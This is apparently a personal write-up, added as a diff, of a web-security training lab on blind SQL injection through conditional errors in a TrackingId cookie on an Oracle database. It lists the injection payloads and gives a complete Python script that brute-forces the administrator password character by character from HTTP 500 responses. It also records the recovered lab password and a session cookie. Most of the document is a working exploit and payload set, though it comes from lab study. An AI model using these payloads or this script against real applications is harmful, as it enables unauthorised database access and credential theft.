@@ -1,0 +1,72 @@
+#Step 1:
+
+sKSk4l2xFqyNQylF' || (SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--  [this returns 200 OK ].
+
+sKSk4l2xFqyNQylF' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--  [this returns 500 error].
+
+
+#Step 2:
+
+sKSk4l2xFqyNQylF' || (SELECT CASE WHEN (length((select password from users where username = 'administrator')) = §5§ ) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--
+
+We recieved 500 error on 20, which means the length of administrator's password is 20.
+
+#Step 3: Bruteforce the password using the python script, just change the if condition "if 'Welcome back!' in r.text:" to this "if r.status_code == 500:
+
+
+sKSk4l2xFqyNQylF' || (SELECT CASE WHEN (substr((select password from users where username = 'administrator'), 1, 1) = 'a') THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--
+
+
+And the final password is 'f3uhv09npabyq42gwc1i' for administrator.
+
+
+
+
+
+
+
+
+
+#Python Script that i used in this lab:   	(just change the parameters that you need)
+
+
+
+import requests
+import string
+
+url = 'https://0ac000b3044e04d682fcc9ca000f0059.web-security-academy.net/filter?category=Corporate+gifts'
+
+def get_length():
+    for i in range(1, 100):
+        cookie = {'TrackingId': 'sKSk4l2xFqyNQylF', 'session': 'MLbv0LUSabqzEGcAVeiGVATvBfcycNLy'}
+        payload = f"' || (SELECT CASE WHEN (length((select password from users where username = 'administrator'))= {i}) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--"
+        cookie['TrackingId'] = cookie['TrackingId'] + payload
+        r = requests.get(url, cookies=cookie)
+        if r.status_code == 500:
+            return i
+
+def brute_force_password(length):
+    password = ''
+    characters = string.ascii_letters + string.digits  # All possible characters
+    for i in range(1, length + 1):
+        for char in characters:
+            cookie = {'TrackingId': 'sKSk4l2xFqyNQylF', 'session': 'MLbv0LUSabqzEGcAVeiGVATvBfcycNLy'}
+            # payload = f"' and substr((select password from users where username = 'administrator'), {i}, 1) = '{char}'--"
+            payload = f"' || (SELECT CASE WHEN (substr((select password from users where username = 'administrator'), {i}, 1) = '{char}') THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--"
+
+            cookie['TrackingId'] = cookie['TrackingId'] + payload
+            r = requests.get(url, cookies=cookie)
+            if r.status_code == 500:
+                password += char
+                print(f"Found character {i}: {char}")
+                break
+    return password
+
+length = get_length()
+print(f"Length is {length}")
+
+password = brute_force_password(length)
+print(f"Password is {password}")
+
+
+
